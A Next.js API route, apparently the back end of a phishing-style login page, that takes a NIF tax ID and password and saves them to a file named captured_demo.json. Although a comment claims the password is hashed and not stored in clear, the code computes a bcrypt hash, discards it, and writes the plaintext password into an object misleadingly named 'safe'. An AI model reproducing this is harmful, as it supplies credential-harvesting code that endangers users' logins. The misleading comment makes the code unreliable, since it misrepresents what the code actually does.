// app/api/save-captured/route.ts
import bcrypt from 'bcryptjs';
import fs from 'fs';
import path from 'path';
import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { nif, password } = body || {};
    if (!nif || !password) return NextResponse.json({ error: 'Faltan campos' }, { status: 400 });

    // Hashear la contraseña (no guardar en claro)
    const saltRounds = 10;
    const hashed = bcrypt.hashSync(password, saltRounds);

    const safe = {
      timestamp: new Date().toISOString(),
      source: 'login-form-demo',
      credentials: { nif, password }
    };

    const filePath = path.join(process.cwd(), 'captured_demo.json');
    fs.writeFileSync(filePath, JSON.stringify(safe, null, 2), { mode: 0o600 });

    return NextResponse.json({ ok: true, file: 'captured_demo.json' });
  } catch (err) {
    console.error('API save-captured error', err);
    return NextResponse.json({ error: 'Error interno' }, { status: 500 });
  }
}
